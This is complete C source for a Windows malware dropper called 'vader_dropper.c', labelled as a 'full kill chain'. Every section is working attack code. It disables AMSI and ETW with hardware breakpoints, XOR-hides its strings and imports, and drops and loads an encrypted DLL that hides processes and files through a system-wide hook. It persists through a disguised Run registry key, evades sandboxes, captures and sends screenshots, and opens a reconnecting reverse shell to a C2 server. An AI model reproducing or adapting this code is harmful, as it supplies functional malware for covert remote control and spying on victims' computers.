/*
 * vader_dropper.c — CHEYANNE Single-Click Full Kill Chain
 * 22DIV / george wu
 *
 * One exe. One click. Invisible reverse shell.
 *
 * Sequence:
 *   1. AMSI bypass (HWBP DR0)
 *   2. ETW bypass (HWBP DR1)
 *   3. Drop cloak.dll to temp
 *   4. Load cloak → hooks install (process/file/connection hiding)
 *   5. System-wide CBT hook (concealment spreads)
 *   6. Reverse shell to C2
 *   7. Cleanup on exit
 */

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>

#include "cloak_payload.h"

/* ── XOR CONFIG ── */
#define XOR_KEY 0xB5

/* "amsi.dll" */
static const unsigned char xAmsiDll[] = {
    0xD4, 0xD8, 0xC6, 0xDC, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" */
static const unsigned char xAmsiScanBuffer[] = {
    0xF4, 0xD8, 0xC6, 0xDC, 0xE6, 0xD6, 0xD4, 0xDB,
    0xF7, 0xC0, 0xD3, 0xD3, 0xD0, 0xC7
};
#define xAmsiScanBuffer_LEN 14

/* "ntdll.dll" */
static const unsigned char xNtdll[] = {
    0xDB, 0xC1, 0xD1, 0xD9, 0xD9, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xNtdll_LEN 9

/* "EtwEventWrite" */
static const unsigned char xEtwEventWrite[] = {
    0xF0, 0xC1, 0xC2, 0xF0, 0xC3, 0xD0, 0xDB, 0xC1,
    0xE2, 0xC7, 0xDC, 0xC1, 0xD0
};
#define xEtwEventWrite_LEN 13

/* ── SHELL CONFIG ── */
#define SHELL_XOR_KEY 0xBE

/* "cmd.exe" */
static const unsigned char xCmd[] = {
    0xDD, 0xD3, 0xDA, 0x90, 0xDB, 0xC6, 0xDB
};
#define xCmd_LEN 7

/* "192.168.1.100" — default C2 */
static const unsigned char xC2Addr[] = {
    0x8F, 0x87, 0x8C, 0x90, 0x8F, 0x88, 0x86, 0x90,
    0x8F, 0x90, 0x8F, 0x8E, 0x8E
};
#define xC2Addr_LEN 13

/* "CloakHookProc" */
static const unsigned char xCloakHookProc[] = {
    0xF6, 0xD9, 0xDA, 0xD4, 0xDE, 0xFD, 0xDA, 0xDA,
    0xDE, 0xE5, 0xC7, 0xDA, 0xD6
};
#define xCloakHookProc_LEN 13

/* "msvcrt_cache.dll" */
static const unsigned char xDropName[] = {
    0xD8, 0xC6, 0xC3, 0xD6, 0xC7, 0xC1, 0xEA, 0xD6,
    0xD4, 0xD6, 0xDD, 0xD0, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xDropName_LEN 16

/* "svchost_update.exe" ^ 0xBE — persistence filename */
static const unsigned char xPersistName[] = {
    0xCD, 0xC8, 0xDD, 0xD6, 0xD1, 0xCD, 0xCA, 0xE1,
    0xCB, 0xCE, 0xDA, 0xDF, 0xCA, 0xDB, 0x90, 0xDB,
    0xC6, 0xDB
};
#define xPersistName_LEN 18

/* "SecurityHealthSystray" ^ 0xBE — registry value name */
static const unsigned char xRegValName[] = {
    0xED, 0xDB, 0xDD, 0xCB, 0xCC, 0xD7, 0xCA, 0xC7,
    0xF6, 0xDB, 0xDF, 0xD2, 0xCA, 0xD6, 0xED, 0xC7,
    0xCD, 0xCA, 0xCC, 0xDF, 0xC7
};
#define xRegValName_LEN 21

/* "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^ 0xBE */
static const unsigned char xRegPath[] = {
    0xED, 0xF1, 0xF8, 0xEA, 0xE9, 0xFF, 0xEC, 0xFB,
    0xE2, 0xF3, 0xD7, 0xDD, 0xCC, 0xD1, 0xCD, 0xD1,
    0xD8, 0xCA, 0xE2, 0xE9, 0xD7, 0xD0, 0xDA, 0xD1,
    0xC9, 0xCD, 0xE2, 0xFD, 0xCB, 0xCC, 0xCC, 0xDB,
    0xD0, 0xCA, 0xE8, 0xDB, 0xCC, 0xCD, 0xD7, 0xD1,
    0xD0, 0xE2, 0xEC, 0xCB, 0xD0
};
#define xRegPath_LEN 45

#define C2_DEFAULT_PORT 53682
#define C2_NOTIFY_PORT  53683
#define RECONNECT_MS    5000
#define MAX_RETRIES     0

static void xor_decode(unsigned char *buf, int len, unsigned char key) {
    for (int i = 0; i < len; i++) buf[i] ^= key;
}

/* ── DYNAMIC IMPORT RESOLUTION ──
 * Pull high-signal APIs out of the IAT.
 * Only GetProcAddress/LoadLibrary/VirtualAlloc remain in imports.
 */
typedef SOCKET (WSAAPI *pWSASocket)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef int (WSAAPI *pWSAConnect)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
typedef HHOOK (WINAPI *pSetWindowsHookExA)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL (WINAPI *pUnhookWindowsHookEx)(HHOOK);
typedef BOOL (WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef PVOID (WINAPI *pAddVectoredExceptionHandler)(ULONG, PVECTORED_EXCEPTION_HANDLER);

static pWSASocket                  fn_WSASocket = NULL;
static pWSAConnect                 fn_WSAConnect = NULL;
static pSetWindowsHookExA          fn_SetWindowsHookExA = NULL;
static pUnhookWindowsHookEx        fn_UnhookWindowsHookEx = NULL;
static pCreateProcessA             fn_CreateProcessA = NULL;
static pAddVectoredExceptionHandler fn_AddVEH = NULL;

/* XOR'd API names — resolved at runtime, never in IAT */
/* "ws2_32.dll" ^ 0xB5 */
static const unsigned char xWs2[] = {
    0xC2, 0xC6, 0x87, 0xE2, 0x82, 0x87, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xWs2_LEN 10

/* "WSASocketA" ^ 0xB5 */
static const unsigned char xWSASocketA[] = {
    0xE2, 0xE6, 0xF4, 0xE6, 0xDA, 0xD6, 0xDE, 0xD0, 0xC1, 0xF4
};
#define xWSASocketA_LEN 10

/* "WSAConnect" ^ 0xB5 */
static const unsigned char xWSAConnect[] = {
    0xE2, 0xE6, 0xF4, 0xF6, 0xDA, 0xDB, 0xDB, 0xD0, 0xD6, 0xC1
};
#define xWSAConnect_LEN 10

/* "user32.dll" ^ 0xB5 */
static const unsigned char xUser32[] = {
    0xC0, 0xC6, 0xD0, 0xC7, 0x82, 0x87, 0x9B, 0xD1, 0xD9, 0xD9
};
#define xUser32_LEN 10

/* "SetWindowsHookExA" ^ 0xB5 */
static const unsigned char xSetWinHook[] = {
    0xE6, 0xD0, 0xC1, 0xE2, 0xDC, 0xDB, 0xD1, 0xDA, 0xC2, 0xC6,
    0xFD, 0xDA, 0xDA, 0xDE, 0xF0, 0xC5, 0xF4
};
#define xSetWinHook_LEN 17

/* "UnhookWindowsHookEx" ^ 0xB5 */
static const unsigned char xUnhookWin[] = {
    0xE0, 0xDB, 0xDD, 0xDA, 0xDA, 0xDE, 0xE2, 0xDC, 0xDB, 0xD1,
    0xDA, 0xC2, 0xC6, 0xFD, 0xDA, 0xDA, 0xDE, 0xF0, 0xC5
};
#define xUnhookWin_LEN 19

/* "kernel32.dll" ^ 0xB5 */
static const unsigned char xKernel32[] = {
    0xDE, 0xD0, 0xC7, 0xDB, 0xD0, 0xD9, 0x82, 0x87, 0x9B, 0xD1,
    0xD9, 0xD9
};
#define xKernel32_LEN 12

/* "CreateProcessA" ^ 0xB5 */
static const unsigned char xCreateProc[] = {
    0xF6, 0xC7, 0xD0, 0xD4, 0xC1, 0xD0, 0xE5, 0xC7, 0xDA, 0xD6,
    0xD0, 0xC6, 0xC6, 0xF4
};
#define xCreateProc_LEN 14

/* "AddVectoredExceptionHandler" ^ 0xB5 */
static const unsigned char xAddVEH[] = {
    0xF4, 0xD1, 0xD1, 0xE3, 0xD0, 0xD6, 0xC1, 0xDA, 0xC7, 0xD0,
    0xD1, 0xF0, 0xC5, 0xD6, 0xD0, 0xC5, 0xC1, 0xDC, 0xDA, 0xDB,
    0xFD, 0xD4, 0xDB, 0xD1, 0xD9, 0xD0, 0xC7
};
#define xAddVEH_LEN 27

static BOOL resolve_dynamic_imports(void) {
    unsigned char buf[64];

    memcpy(buf, xWs2, xWs2_LEN); xor_decode(buf, xWs2_LEN, XOR_KEY); buf[xWs2_LEN] = 0;
    HMODULE hWs2 = LoadLibraryA((char *)buf); memset(buf, 0, 64);

    memcpy(buf, xUser32, xUser32_LEN); xor_decode(buf, xUser32_LEN, XOR_KEY); buf[xUser32_LEN] = 0;
    HMODULE hUser = LoadLibraryA((char *)buf); memset(buf, 0, 64);

    HMODULE hK32 = GetModuleHandleA(NULL);
    memcpy(buf, xKernel32, xKernel32_LEN); xor_decode(buf, xKernel32_LEN, XOR_KEY); buf[xKernel32_LEN] = 0;
    hK32 = GetModuleHandleA((char *)buf); memset(buf, 0, 64);

    if (!hWs2 || !hUser || !hK32) return FALSE;

    memcpy(buf, xWSASocketA, xWSASocketA_LEN); xor_decode(buf, xWSASocketA_LEN, XOR_KEY); buf[xWSASocketA_LEN] = 0;
    fn_WSASocket = (pWSASocket)GetProcAddress(hWs2, (char *)buf); memset(buf, 0, 64);

    memcpy(buf, xWSAConnect, xWSAConnect_LEN); xor_decode(buf, xWSAConnect_LEN, XOR_KEY); buf[xWSAConnect_LEN] = 0;
    fn_WSAConnect = (pWSAConnect)GetProcAddress(hWs2, (char *)buf); memset(buf, 0, 64);

    memcpy(buf, xSetWinHook, xSetWinHook_LEN); xor_decode(buf, xSetWinHook_LEN, XOR_KEY); buf[xSetWinHook_LEN] = 0;
    fn_SetWindowsHookExA = (pSetWindowsHookExA)GetProcAddress(hUser, (char *)buf); memset(buf, 0, 64);

    memcpy(buf, xUnhookWin, xUnhookWin_LEN); xor_decode(buf, xUnhookWin_LEN, XOR_KEY); buf[xUnhookWin_LEN] = 0;
    fn_UnhookWindowsHookEx = (pUnhookWindowsHookEx)GetProcAddress(hUser, (char *)buf); memset(buf, 0, 64);

    memcpy(buf, xCreateProc, xCreateProc_LEN); xor_decode(buf, xCreateProc_LEN, XOR_KEY); buf[xCreateProc_LEN] = 0;
    fn_CreateProcessA = (pCreateProcessA)GetProcAddress(hK32, (char *)buf); memset(buf, 0, 64);

    memcpy(buf, xAddVEH, xAddVEH_LEN); xor_decode(buf, xAddVEH_LEN, XOR_KEY); buf[xAddVEH_LEN] = 0;
    fn_AddVEH = (pAddVectoredExceptionHandler)GetProcAddress(hK32, (char *)buf); memset(buf, 0, 64);

    return (fn_WSASocket && fn_WSAConnect && fn_SetWindowsHookExA &&
            fn_UnhookWindowsHookEx && fn_CreateProcessA && fn_AddVEH);
}

/* ══════════════════════════════════════════════════════════════
 * PHASE 1: DARK ROOM — AMSI + ETW BYPASS
 * ══════════════════════════════════════════════════════════════ */

static volatile void *g_pAmsi = NULL;
static volatile void *g_pEtw  = NULL;

static void *resolve_func(const unsigned char *xDll, int dllLen,
                           const unsigned char *xFunc, int funcLen,
                           int useGetModuleHandle) {
    unsigned char dll[32], func[64];
    HMODULE hMod;

    memcpy(dll, xDll, dllLen);
    xor_decode(dll, dllLen, XOR_KEY);
    dll[dllLen] = 0;

    memcpy(func, xFunc, funcLen);
    xor_decode(func, funcLen, XOR_KEY);
    func[funcLen] = 0;

    hMod = useGetModuleHandle ?
        GetModuleHandleA((char *)dll) : LoadLibraryA((char *)dll);
    if (!hMod) { memset(dll, 0, 32); memset(func, 0, 64); return NULL; }

    void *p = (void *)GetProcAddress(hMod, (char *)func);
    memset(dll, 0, 32);
    memset(func, 0, 64);
    return p;
}

#define DR_SETUP_CODE 0x22D1

static volatile BOOL g_drSetup = FALSE;

static LONG WINAPI DarkRoomHandler(PEXCEPTION_POINTERS p) {
    if (p->ExceptionRecord->ExceptionCode == DR_SETUP_CODE && !g_drSetup) {
        p->ContextRecord->Dr0 = (DWORD64)g_pAmsi;
        p->ContextRecord->Dr1 = (DWORD64)g_pEtw;
        p->ContextRecord->Dr7 &= ~(0xFULL << 16);
        p->ContextRecord->Dr7 &= ~(0xFULL << 20);
        p->ContextRecord->Dr7 |= (1 << 0);
        p->ContextRecord->Dr7 |= (1 << 2);
        g_drSetup = TRUE;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if (p->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    if ((void *)p->ContextRecord->Rip == g_pAmsi) {
        p->ContextRecord->Rax = (DWORD64)0x80070057;
        p->ContextRecord->Rip = *(DWORD64 *)p->ContextRecord->Rsp;
        p->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    if ((void *)p->ContextRecord->Rip == g_pEtw) {
        p->ContextRecord->Rax = 0;
        p->ContextRecord->Rip = *(DWORD64 *)p->ContextRecord->Rsp;
        p->ContextRecord->Rsp += 8;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL activate_dark_room(void) {
    g_pAmsi = resolve_func(xAmsiDll, xAmsiDll_LEN,
                           xAmsiScanBuffer, xAmsiScanBuffer_LEN, 0);
    g_pEtw  = resolve_func(xNtdll, xNtdll_LEN,
                           xEtwEventWrite, xEtwEventWrite_LEN, 1);

    if (!g_pAmsi || !g_pEtw) return FALSE;

    PVOID hVeh = fn_AddVEH(1, DarkRoomHandler);
    if (!hVeh) return FALSE;

    RaiseException(DR_SETUP_CODE, 0, 0, NULL);
    return g_drSetup;
}

/* ══════════════════════════════════════════════════════════════
 * PHASE 2: CLOAK — DROP AND LOAD
 * ══════════════════════════════════════════════════════════════ */

static HMODULE g_hCloak = NULL;
static HHOOK   g_hHook  = NULL;
static char    g_dllPath[MAX_PATH] = {0};

static BOOL deploy_cloak(void) {
    char tmpDir[MAX_PATH];
    unsigned char dropName[32];

    memcpy(dropName, xDropName, xDropName_LEN);
    xor_decode(dropName, xDropName_LEN, XOR_KEY);
    dropName[xDropName_LEN] = 0;

    GetTempPathA(MAX_PATH, tmpDir);
    snprintf(g_dllPath, MAX_PATH, "%s%s", tmpDir, (char *)dropName);
    memset(dropName, 0, sizeof(dropName));

    BYTE *decrypted = (BYTE *)VirtualAlloc(NULL, CLOAK_DLL_SIZE,
                                            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted) return FALSE;

    for (DWORD i = 0; i < CLOAK_DLL_SIZE; i++)
        decrypted[i] = cloak_dll_data[i] ^ payload_key[i % PAYLOAD_KEY_LEN];

    HANDLE hFile = CreateFileA(g_dllPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        SecureZeroMemory(decrypted, CLOAK_DLL_SIZE);
        VirtualFree(decrypted, 0, MEM_RELEASE);
        return FALSE;
    }

    DWORD written;
    WriteFile(hFile, decrypted, CLOAK_DLL_SIZE, &written, NULL);
    CloseHandle(hFile);

    SecureZeroMemory(decrypted, CLOAK_DLL_SIZE);
    VirtualFree(decrypted, 0, MEM_RELEASE);

    if (written != CLOAK_DLL_SIZE) {
        DeleteFileA(g_dllPath);
        return FALSE;
    }

    g_hCloak = LoadLibraryA(g_dllPath);
    if (!g_hCloak) {
        DeleteFileA(g_dllPath);
        return FALSE;
    }

    unsigned char hookProc[32];
    memcpy(hookProc, xCloakHookProc, xCloakHookProc_LEN);
    xor_decode(hookProc, xCloakHookProc_LEN, XOR_KEY);
    hookProc[xCloakHookProc_LEN] = 0;

    HOOKPROC proc = (HOOKPROC)GetProcAddress(g_hCloak, (char *)hookProc);
    memset(hookProc, 0, sizeof(hookProc));

    if (proc)
        g_hHook = fn_SetWindowsHookExA(WH_CBT, proc, g_hCloak, 0);

    return TRUE;
}

static void cleanup_cloak(void) {
    if (g_hHook) {
        if (fn_UnhookWindowsHookEx) fn_UnhookWindowsHookEx(g_hHook);
        g_hHook = NULL;
    }
    if (g_hCloak) {
        FreeLibrary(g_hCloak);
        g_hCloak = NULL;
    }
    if (g_dllPath[0]) {
        Sleep(100);
        DeleteFileA(g_dllPath);
        g_dllPath[0] = 0;
    }
}

/* ══════════════════════════════════════════════════════════════
 * PHASE 2.5: PERSISTENCE — SHUTDOWN SURVIVAL
 * ══════════════════════════════════════════════════════════════ */

static BOOL install_persistence(void) {
    char selfPath[MAX_PATH];
    char targetPath[MAX_PATH];
    char appdata[MAX_PATH];
    unsigned char regPath[64], regVal[32], persistName[32];
    HKEY hKey;

    GetModuleFileNameA(NULL, selfPath, MAX_PATH);

    memcpy(persistName, xPersistName, xPersistName_LEN);
    xor_decode(persistName, xPersistName_LEN, SHELL_XOR_KEY);
    persistName[xPersistName_LEN] = 0;

    if (!GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH))
        return FALSE;
    snprintf(targetPath, MAX_PATH, "%s\\Microsoft\\Windows\\%s",
             appdata, (char *)persistName);
    memset(persistName, 0, sizeof(persistName));

    if (GetFileAttributesA(targetPath) == INVALID_FILE_ATTRIBUTES)
        CopyFileA(selfPath, targetPath, FALSE);

    memcpy(regPath, xRegPath, xRegPath_LEN);
    xor_decode(regPath, xRegPath_LEN, SHELL_XOR_KEY);
    regPath[xRegPath_LEN] = 0;

    memcpy(regVal, xRegValName, xRegValName_LEN);
    xor_decode(regVal, xRegValName_LEN, SHELL_XOR_KEY);
    regVal[xRegValName_LEN] = 0;

    if (RegOpenKeyExA(HKEY_CURRENT_USER, (char *)regPath, 0,
                      KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, (char *)regVal, 0, REG_SZ,
                       (BYTE *)targetPath, (DWORD)strlen(targetPath) + 1);
        RegCloseKey(hKey);
    }

    memset(regPath, 0, sizeof(regPath));
    memset(regVal, 0, sizeof(regVal));
    return TRUE;
}

/* ══════════════════════════════════════════════════════════════
 * PHASE 2.6: SCREEN CAPTURE — VNC-STYLE GRAB
 * ══════════════════════════════════════════════════════════════ */

static void send_screenshot(SOCKET s) {
    HDC hdcScreen = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, w, h);
    HGDIOBJ hOld = SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    BITMAPINFOHEADER bi;
    memset(&bi, 0, sizeof(bi));
    bi.biSize = sizeof(BITMAPINFOHEADER);
    bi.biWidth = w;
    bi.biHeight = -h;
    bi.biPlanes = 1;
    bi.biBitCount = 24;
    bi.biCompression = BI_RGB;

    int stride = ((w * 3 + 3) & ~3);
    int dataSize = stride * h;

    BYTE *pixels = (BYTE *)VirtualAlloc(NULL, dataSize,
                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pixels) {
        SelectObject(hdcMem, hOld);
        DeleteObject(hBmp);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    GetDIBits(hdcMem, hBmp, 0, h, pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);

    char hdr[128];
    int hdrLen = snprintf(hdr, sizeof(hdr), "SCREENSHOT|%d|%d|%d\n", w, h, dataSize);
    send(s, hdr, hdrLen, 0);

    int sent = 0;
    while (sent < dataSize) {
        int chunk = dataSize - sent;
        if (chunk > 4096) chunk = 4096;
        int n = send(s, (char *)(pixels + sent), chunk, 0);
        if (n <= 0) break;
        sent += n;
    }

    VirtualFree(pixels, 0, MEM_RELEASE);
    SelectObject(hdcMem, hOld);
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

/* ══════════════════════════════════════════════════════════════
 * PHASE 3: REVERSE SHELL
 * ══════════════════════════════════════════════════════════════ */

static SOCKET connect_c2(const char *ip, int port) {
    SOCKET s = fn_WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in addr;
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((unsigned short)port);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (fn_WSAConnect(s, (SOCKADDR *)&addr, sizeof(addr),
                      NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

static void send_notify(const char *ip, int port) {
    SOCKET s = fn_WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return;

    struct sockaddr_in addr;
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons((unsigned short)port);
    addr.sin_addr.s_addr = inet_addr(ip);

    if (fn_WSAConnect(s, (SOCKADDR *)&addr, sizeof(addr),
                      NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        return;
    }

    char hostname[64] = {0};
    gethostname(hostname, sizeof(hostname) - 1);

    char buf[128];
    int len = snprintf(buf, sizeof(buf), "%s|%d|%d\n",
        hostname, g_hCloak ? 1 : 0, C2_DEFAULT_PORT);

    send(s, buf, len, 0);
    closesocket(s);
    memset(buf, 0, sizeof(buf));
    memset(hostname, 0, sizeof(hostname));
}

static void exec_cmd(SOCKET s, const char *cmdline) {
    unsigned char shell[8];
    memcpy(shell, xCmd, xCmd_LEN);
    xor_decode(shell, xCmd_LEN, SHELL_XOR_KEY);
    shell[xCmd_LEN] = 0;

    char full[4200];
    snprintf(full, sizeof(full), "%s /c %s", (char *)shell, cmdline);
    memset(shell, 0, sizeof(shell));

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return;
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = NULL;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;

    if (fn_CreateProcessA(NULL, full, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        char pipebuf[4096];
        DWORD nr;
        while (ReadFile(hReadPipe, pipebuf, sizeof(pipebuf), &nr, NULL) && nr > 0)
            send(s, pipebuf, (int)nr, 0);
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        CloseHandle(hWritePipe);
    }
    CloseHandle(hReadPipe);
    memset(full, 0, sizeof(full));
}

static void interactive_loop(SOCKET s) {
    char prompt[] = "> ";
    char recvbuf[4096];
    char cwd[MAX_PATH];

    GetCurrentDirectoryA(MAX_PATH, cwd);
    snprintf(recvbuf, sizeof(recvbuf), "%s%s", cwd, prompt);
    send(s, recvbuf, (int)strlen(recvbuf), 0);

    while (1) {
        int n = recv(s, recvbuf, sizeof(recvbuf) - 1, 0);
        if (n <= 0) break;
        recvbuf[n] = 0;

        while (n > 0 && (recvbuf[n-1] == '\n' || recvbuf[n-1] == '\r'))
            recvbuf[--n] = 0;
        if (n == 0) {
            GetCurrentDirectoryA(MAX_PATH, cwd);
            snprintf(recvbuf, sizeof(recvbuf), "%s%s", cwd, prompt);
            send(s, recvbuf, (int)strlen(recvbuf), 0);
            continue;
        }

        if (_stricmp(recvbuf, "exit") == 0 || _stricmp(recvbuf, "quit") == 0)
            break;

        if (_strnicmp(recvbuf, "cd ", 3) == 0) {
            SetCurrentDirectoryA(recvbuf + 3);
            GetCurrentDirectoryA(MAX_PATH, cwd);
            snprintf(recvbuf, sizeof(recvbuf), "%s%s", cwd, prompt);
            send(s, recvbuf, (int)strlen(recvbuf), 0);
            continue;
        }

        if (_stricmp(recvbuf, "screenshot") == 0 || _stricmp(recvbuf, "screen") == 0) {
            send_screenshot(s);
            GetCurrentDirectoryA(MAX_PATH, cwd);
            snprintf(recvbuf, sizeof(recvbuf), "%s%s", cwd, prompt);
            send(s, recvbuf, (int)strlen(recvbuf), 0);
            continue;
        }

        exec_cmd(s, recvbuf);

        GetCurrentDirectoryA(MAX_PATH, cwd);
        snprintf(recvbuf, sizeof(recvbuf), "%s%s", cwd, prompt);
        send(s, recvbuf, (int)strlen(recvbuf), 0);
    }
}

/* ══════════════════════════════════════════════════════════════
 * MAIN — FULL KILL CHAIN
 * ══════════════════════════════════════════════════════════════ */

static BOOL sandbox_check(void) {
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    if (mem.ullTotalPhys < (DWORDLONG)2 * 1024 * 1024 * 1024)
        return TRUE;

    DWORD ticks1 = GetTickCount();
    Sleep(1500);
    DWORD ticks2 = GetTickCount();
    if ((ticks2 - ticks1) < 1000)
        return TRUE;

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2)
        return TRUE;

    return FALSE;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    WSADATA wsa;
    char c2ip[64];
    int c2port = C2_DEFAULT_PORT;
    int attempts = 0;

    (void)hInst; (void)hPrev; (void)nShow;

    /* Phase 0: Environment check */
    if (sandbox_check()) return 0;

    /* Phase 0.5: Resolve dynamic imports */
    if (!resolve_dynamic_imports()) return 0;

    /* Phase 1: Dark Room */
    activate_dark_room();

    /* Phase 2: Cloak */
    deploy_cloak();

    /* Phase 2.5: Persistence — shutdown survival */
    install_persistence();

    /* Resolve C2 */
    if (lpCmd && lpCmd[0]) {
        c2ip[0] = 0;
        sscanf(lpCmd, "%63s %d", c2ip, &c2port);
    }
    if (!lpCmd || !lpCmd[0] || !c2ip[0]) {
        unsigned char ipBuf[64];
        memcpy(ipBuf, xC2Addr, xC2Addr_LEN);
        xor_decode(ipBuf, xC2Addr_LEN, SHELL_XOR_KEY);
        ipBuf[xC2Addr_LEN] = 0;
        strncpy(c2ip, (char *)ipBuf, sizeof(c2ip) - 1);
        c2ip[sizeof(c2ip) - 1] = 0;
        memset(ipBuf, 0, sizeof(ipBuf));
    }

    /* Phase 3: Notify + Shell */
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        cleanup_cloak();
        return 1;
    }

    send_notify(c2ip, C2_NOTIFY_PORT);

    while (MAX_RETRIES == 0 || attempts < MAX_RETRIES) {
        SOCKET ch = connect_c2(c2ip, c2port);
        if (ch != INVALID_SOCKET) {
            interactive_loop(ch);
            closesocket(ch);
            attempts = 0;
        } else {
            attempts++;
        }
        Sleep(RECONNECT_MS);
    }

    WSACleanup();
    cleanup_cloak();
    return 0;
}
